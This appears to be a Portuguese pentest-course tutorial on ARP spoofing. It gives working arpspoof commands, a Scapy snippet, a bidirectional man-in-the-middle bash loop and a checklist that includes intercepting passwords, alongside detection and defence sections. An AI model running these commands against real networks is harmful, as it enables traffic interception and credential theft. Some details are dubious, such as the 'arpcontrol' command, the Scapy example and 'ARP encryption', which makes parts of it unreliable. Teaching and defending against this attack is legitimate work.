# ARP Spoofing — Técnicas e Proteção

## Conceito

**ARP Spoofing** (ARP Poisoning) é técnica de enviar frames ARP falsificados para mapear endereço MAC falso.

---

## Como Funciona

### ARP Normal

```
Host A: "Quem é 192.168.1.1?"
Router: "Sou eu, meu MAC é AA:AA:AA:AA:AA:AA"
Host A: Armazena 192.168.1.1 → AA:AA:AA:AA:AA:AA
```

### ARP Spoofing

```
Atacante: "Sou 192.168.1.1, meu MAC é BB:BB:BB:BB:BB:BB"
Vítima: Armazena 192.168.1.1 → BB:BB:BB:BB:BB:BB (ERRADO)
Resultado: Tráfego vai para atacante
```

---

## Ferramentas

### arpspoof

```bash
# Instalação
sudo apt install dsniff

# Uso básico
sudo arpspoof -i eth0 -t 192.168.1.50 192.168.1.1
```

Flags:
- `-i eth0`: Interface
- `-t TARGET`: Alvo
- `GATEWAY`: Router

### arpcache_poison

```bash
# Alternativa
arpcontrol -f
```

### Scapy (Python)

```python
from scapy.all import ARP, sendp

# Criar pacote ARP falso
arp = ARP(pdst="192.168.1.50", psrc="192.168.1.1", hwsrc="AA:AA:AA:AA:AA:AA")

# Enviar
sendp(arp, verbose=False)
```

---

## Script Simples

```bash
#!/bin/bash

ATTACKER_IP="192.168.1.100"
VICTIM_IP="192.168.1.50"
GATEWAY_IP="192.168.1.1"
INTERFACE="eth0"

# Habilitar IP forwarding
sudo sysctl -w net.ipv4.ip_forward=1

# ARP spoofing bidirecional
while true; do
  sudo arpspoof -i $INTERFACE -t $VICTIM_IP $GATEWAY_IP &
  sudo arpspoof -i $INTERFACE -t $GATEWAY_IP $VICTIM_IP &
  sleep 1
done
```

---

## Detecção

### Ferramentas

```bash
# arpwatch - Monitora mudanças ARP
sudo arpwatch -i eth0

# arpalert
arpalert -i eth0

# Wireshark - Filtrar ARP
sudo wireshark
Filter: arp.opcode == 1  # ARP request
```

### Sinais de Alerta

```
- Mesmo IP com múltiplos MACs
- Mudanças frequentes de MAC
- MAC não reconhecido
- Tráfego desviado
```

---

## Defesa

### Estática

```
# Configurar MAC→IP estaticamente
arp -s 192.168.1.1 00:11:22:33:44:55

# Linux
echo "192.168.1.1 00:11:22:33:44:55" >> /etc/ethers
```

### Dinâmica

```
- DHCP snooping
- Dynamic ARP Inspection (DAI)
- ARP encryption
- Port security
```

### Software

```bash
# ArpGuard - Detecta ARP spoofing
sudo apt install arpguard

# XArp - Proteção contra ARP
```

---

## Checklist

```
☐ ARP spoofing ativo
☐ IP forwarding habilitado
☐ Tráfego capturado
☐ Senhas interceptadas
☐ Defesa testada
☐ Recuperação possível
```

---

Próximo: `pos-exploracao/privilege-escalation.md`
